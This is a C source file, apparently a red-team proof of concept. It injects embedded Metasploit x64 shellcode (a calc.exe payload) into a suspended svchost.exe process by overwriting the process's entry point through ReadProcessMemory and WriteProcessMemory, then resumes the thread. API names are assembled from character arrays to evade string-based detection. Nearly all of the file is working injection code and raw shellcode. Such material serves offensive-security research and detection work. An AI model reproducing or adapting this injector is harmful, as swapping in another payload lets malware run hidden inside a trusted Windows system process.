/*
*
* working. inject cmd.exe PE into remote process at system allocated memory address
* then patch remote entry point with trampoline to return to
* 
* Steps:
* 1. Create SUSPENDED remote process;
* 2. Read PEB from remote process, get ImageBaseAddress;
* 3. Read from ImageBaseAddress, get PE headers, calculate entry point of remote process;
* 4. Write shellcode to remote entry point;
* 5. Resume thread;
*
*/

#include <windows.h>
#include <stdio.h>
#include "Structs.h"

#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)
#define SET_LAST_NT_ERROR(s) SetLastError(s)
#define RVA2VA(Type,ImgBase,Rva) (Type)((ULONG_PTR)ImgBase + Rva)
#define PTR(x) (ULONG_PTR)x

// comment out to suppress output
//
#define _DBG

#ifdef _DBG
#define DLOG(x, ...) printf(x, ##__VA_ARGS__)
#define _INT getchar()
#else
#define DLOG(x, ...)
#define _INT
#endif

//x64 calc metasploit shellcode 
unsigned char payload[] = {
	0x90, 0x90, 0x90, 0x90, 0x90, 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00, 0x90
};

int main()
{
	WCHAR szNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l',  'l', 0x0 };
	unsigned char ucNtQueryInformationProcess[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's',  's', 0x0 };
	unsigned char ucNtAllocateVirtualMemory[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r',  'y', 0x0 };
	unsigned char ucNtWriteVirtualMemory[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r',  'y', 0x0 };

	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0x0 };
	PROCESS_BASIC_INFORMATION pbi = { 0x0 };
	FARPROC NtQueryInformationProcess = NULL;
	FARPROC NtAllocateVirtualMemory = NULL;
	FARPROC NtWriteVirtualMemory = NULL;
	ULONG uRetern = 0x0;
	NTSTATUS status = 0x0;
	PVOID pRemoteImgBaseAddr = NULL;
	PPEB pPeb = NULL;
	LPVOID buf = NULL;
	SIZE_T sPayload = sizeof(payload);
	SIZE_T sBytesAllocated = sizeof(payload);
	SIZE_T sBytesWritten = 0x0;

	NtQueryInformationProcess = GetProcAddress(GetModuleHandle(szNtdll), ucNtQueryInformationProcess);
	if (NULL == NtQueryInformationProcess)
	{
		DLOG("[-]Failed to resolve NtQueryInformationProcess ... \n");
		goto _exit;
	}

	CreateProcess(
		L"C:\\Windows\\System32\\svchost.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		L"c:\\windows\\system32\\",
		&si, &pi);

	DLOG("[*]Process created with PID: %d\n", pi.dwProcessId);
	DLOG("[*]Process handle: 0x%.8x\n", pi.hProcess);

	if (!NT_SUCCESS(status = NtQueryInformationProcess(
		pi.hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&uRetern)))
	{
		SET_LAST_NT_ERROR(status);
		DLOG("[-]Failed to query process information ... 0x%.8X\n", GetLastError());
		goto _exit;
	}

	pPeb = pbi.PebBaseAddress;
	if (NULL == pPeb)
	{
		DLOG("[-]Failed to get PEB ...\n");
		goto _exit;
	}

	DLOG("[*]PEB base address @ >>>>>>>>> 0x%p\n", pPeb);
	DLOG("[*]Address of PEB.ImageBaseAddress member @ >>>>>>>>> 0x%p\n", &pPeb->ImageBaseAddress);

	if (!ReadProcessMemory(pi.hProcess, &pPeb->ImageBaseAddress, &pRemoteImgBaseAddr, sizeof(PVOID), NULL))
	{
		DLOG("[-]Failed to read process memroy with error: 0x%.8X\n", GetLastError());
		goto _exit;
	}

	DLOG("[*]Remote image base address @ >>>>>>>> 0x%p\n", pRemoteImgBaseAddr);

	PBYTE bImgHdr[0x200] = { 0x0 };
	if (!ReadProcessMemory(pi.hProcess, pRemoteImgBaseAddr, &bImgHdr, sizeof(bImgHdr), NULL))
	{
		DLOG("[-]Failed ot read remote image header data with error: %d\n", GetLastError());
		goto _exit;
	}

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)bImgHdr;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
	{
		DLOG("[-]Failed to reoslve dos header...\n");
		goto _exit;
	}

	PIMAGE_NT_HEADERS pImgNtHdrs = RVA2VA(PIMAGE_NT_HEADERS, pImgDosHdr, pImgDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
	DWORD dwEntryPoint = ImgOptHdr.AddressOfEntryPoint;

	NtWriteVirtualMemory = GetProcAddress(GetModuleHandle(szNtdll), ucNtWriteVirtualMemory);
	if (NULL == NtWriteVirtualMemory)
	{
		DLOG("[-]Failed to resolve NtWriteVirtualMemory ... \n");
		goto _exit;
	}

	DLOG("[*]Remote image entry point @ >>>>>>>>> 0x%p\n", (PVOID)(PTR(pRemoteImgBaseAddr) + dwEntryPoint));

	if (!WriteProcessMemory(pi.hProcess, (PVOID)(PTR(pRemoteImgBaseAddr) + dwEntryPoint), payload, sPayload, &sBytesWritten))
	{
		DLOG("[-]Failed to write image to remote process with error: 0x%.8X\n", GetLastError());
		goto _exit;
	}

	DLOG("[*]Press <Enter> to resume thread ...");
	_INT;

	ResumeThread(pi.hThread);

_exit:
	if (NULL != pi.hProcess)
		CloseHandle(pi.hProcess);

	return 0;
}

